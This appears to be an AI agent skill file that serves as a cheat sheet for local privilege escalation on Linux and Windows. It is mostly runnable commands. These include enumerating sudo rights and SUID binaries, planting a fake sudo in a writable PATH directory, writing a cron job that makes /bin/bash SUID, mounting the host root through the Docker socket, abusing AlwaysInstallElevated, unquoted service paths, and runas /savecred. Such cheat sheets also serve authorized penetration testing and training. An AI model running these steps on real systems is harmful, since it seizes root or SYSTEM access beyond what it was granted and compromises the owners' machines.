---
name: privilege-escalation
description: Local privilege escalation techniques for Windows and Linux. Focuses on LOLBAS and misconfiguration exploitation.
---

# Privilege Escalation

## Quick Checks First

### Linux
```bash
# Current privs
id
sudo -l 2>/dev/null          # Can we sudo anything?
cat /etc/sudoers 2>/dev/null # Sudo config

# Kernel exploits
uname -a                     # Check for known CVEs
# Search for: Dirty COW, Dirty Pipe, CVE-2023-2640, etc.

# SUID/GID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable paths
find / -writable -type d 2>/dev/null | head -20
```

### Windows
```bash
whoami /priv                # Check enabled privileges
whoami /groups              # Group memberships

# Common privesc vectors
# - SeDebugPrivilege + process token theft
# - SeImpersonatePrivilege + potato family
# - SeTakeOwnershipPrivilege + service hijack
```

## Linux Techniques

### Path Hijacking (if writable PATH dir)
```bash
# If /usr/local/bin is writable by us
echo '/bin/bash -p' > /usr/local/bin/sudo
export PATH=/usr/local/bin:$PATH
sudo any_command  # Runs our bash instead
```

### Cron Job Privesc (if writable cron.d)
```bash
echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/privesc
# Wait for cron to run, then /bin/bash -p
```

### Docker Socket Access
```bash
# If we can access docker socket
docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host
```

## Windows Techniques

### AlwaysInstallElevated (Registry)
```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If = 1, create .msi that runs as SYSTEM
```

### Unquoted Service Paths
```bash
wmic service where "pathname like '% %'" get name,pathname
# If service path has spaces and no quotes, place executable in that location
```

### Stored Credentials (Windows Credential Manager)
```bash
cmdkey /list
runas /savecred /user:ADMINISTRATOR cmd.exe
```
